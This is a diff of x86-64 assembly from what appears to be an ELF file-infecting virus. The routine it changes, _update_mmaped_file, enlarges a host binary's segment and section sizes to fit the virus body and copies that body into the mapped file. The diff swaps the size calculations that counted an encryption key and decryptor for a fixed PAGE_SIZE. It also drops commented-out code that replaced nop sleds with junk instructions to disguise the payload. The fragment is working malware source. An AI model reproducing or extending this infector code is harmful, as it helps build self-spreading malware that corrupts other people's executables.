@@ -3,14 +3,6 @@
 
 section .text
 	global _update_mmaped_file
-;	extern _string
-;	extern _final_end
-;	extern _decrypt
-;	extern _start
-;	extern _end_decrypt
-;	extern _o_entry
-;	extern _encrypt_zone
-;	extern _encrypted_part_start
 
 _update_mmaped_file: ; update_mmaped_file(void *mmap_base_address, long file_size, long virus_size, long fd)
 	enter 256, 0
@@ -153,16 +145,7 @@ _else_if:
 ; update p_filesz and p_memsz
 	mov r10, QWORD [rsp + 32] ; take phdr
 	add r10, 32 ; p_filesz offset
-	mov r11, QWORD [rsp + 16] ; take virus size
-	add r11, 8 ; don't forget the 8 first bytes off the entry point, didnt count in virus size
-; calcul _decrypt size
-	lea rdi, [rel _decrypt]
-	lea rsi, [rel _checksum]
-	add rsi, 4
-	sub rsi, rdi
-; add key_size and decrypt size to p_filesz and p_memsz
-	add r11, 256 ; add key size
-	add r11, rsi ; add decrypt size
+	mov r11, PAGE_SIZE
 	add QWORD [r10], r11 ; add virus_size to the segment size in file and in memory
 	add r10, 8 ; p_memsz offset is 8 bytes further p_filesz
 	add QWORD [r10], r11
@@ -201,17 +184,7 @@ _if_offset_equal_virus_offset:
 	add rdi, QWORD [r11] ; add the value of sh_size
 	cmp rdi, QWORD [rsp + 72] ; if (shdr->sh_offset + shdr->sh_size) == virus offset
 	jne _if_offset_greater_or_equal_virus_offset
-; add virus size to this section size
-	mov r10, QWORD [rsp + 16] ; take virus size
-	add r10, 8 ; add the 8 bytes of o_entry
-; calcul _decrypt size
-	lea rdi, [rel _decrypt]
-	lea rsi, [rel _checksum]
-	add rsi, 4
-	sub rsi, rdi
-; add key size and decrypt size on sh_size
-	add r10, 256 ; add key size
-	add r10, rsi ; add decrypt size
+	mov r10, PAGE_SIZE
 	add QWORD [r11], r10 ; add it to sh_size
 
 _if_offset_greater_or_equal_virus_offset:
@@ -284,20 +257,6 @@ _copy_unencrypted_part:
 	sub rcx, rsi ; calcul the size to copy
 	cld
 	rep movsb
-; update our index
-;	lea	rsi, [rel _string]
-;	lea rcx, [rel _encrypted_part_start]
-;	sub rcx, rsi
-;	add QWORD [rsp + 116], rcx
-
-; Then we run _byterpl(depacker start in destination, depacker size);
-; to replace nop sleds by junks instructions
-;	lea rcx, [rel _string]
-;	lea rsi, [rel _encrypted_part_start]
-;	sub rsi, rcx
-;	mov rdi, QWORD [rsp + 108]
-;	add rdi, QWORD [rsp + 116]
-;	call _byterpl
 
 ; Incremente our index in our destination mmap
 	lea rsi, [rel _string]
